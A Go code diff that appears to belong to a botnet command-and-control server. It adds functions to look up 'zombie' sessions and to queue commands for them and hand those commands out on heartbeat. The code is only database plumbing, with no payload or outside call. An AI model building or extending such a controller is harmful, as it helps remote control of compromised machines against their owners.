@@ -2,6 +2,7 @@ package main
 
 import (
 	"database/sql"
+	"encoding/json"
 	"fmt"
 	_ "github.com/go-sql-driver/mysql"
 	"log"
@@ -32,6 +33,63 @@ func InitDb() (*sql.DB, error) {
 
 }
 
+func IdToSid(id int, db *sql.DB) string {
+	query := "SELECT SessionId FROM zombies WHERE id = ?"
+
+	var sid string
+	err := db.QueryRow(query, id).Scan(&sid)
+	if err != nil {
+		if err == sql.ErrNoRows {
+			Error("[ID2SID] The specified ID does not exist")
+		} else {
+			log.Fatal(err)
+		}
+		return ""
+	}
+	return sid
+
+}
+
+func AddToCmdQueue(sid string, cmd_type string, args []string, db *sql.DB) {
+	argsJSON, err := json.Marshal(args)
+	if err != nil {
+		log.Fatalf("Error while parsing args : %v", err)
+	}
+	query := "INSERT INTO commandsqueue (SessionId, Type, Args) VALUES (?, ?, ?)"
+	_, err = db.Exec(query, sid, cmd_type, string(argsJSON))
+	if err != nil {
+		log.Fatalf("Error while inserting data : %v", err)
+
+	}
+	Log("[+CMD2Q] Command succesfully added to queue !")
+}
+
+func GetCmdFromQueue(sid string, db *sql.DB) ResHeartBeat {
+	var firstRes ResHeartBeat
+	var argsJSON string
+	query := "SELECT SessionId, Type, Args FROM commandsqueue WHERE SessionId = ? ORDER BY id ASC LIMIT 1;"
+	err := db.QueryRow(query, sid).Scan(&firstRes.SessionId, &firstRes.Type, &argsJSON)
+
+	if err != nil {
+		if err == sql.ErrNoRows {
+			log.Println("Aucune donnée trouvée dans la table.")
+			return ResHeartBeat{"", "", []interface{}{}}
+		}
+		log.Fatal(err)
+	}
+	err = json.Unmarshal([]byte(argsJSON), &firstRes.Args)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	query = "DELETE FROM commandsqueue WHERE SessionId = ? ORDER BY id ASC LIMIT 1;"
+	_, err1 := db.Query(query, sid)
+	if err1 != nil {
+		log.Fatal(err)
+		
+	}
+	return firstRes
+}
 func ZAvailability(sessionId string, db *sql.DB) bool {
 
 	query := "SELECT SessionId FROM zombies WHERE SessionId = ?"
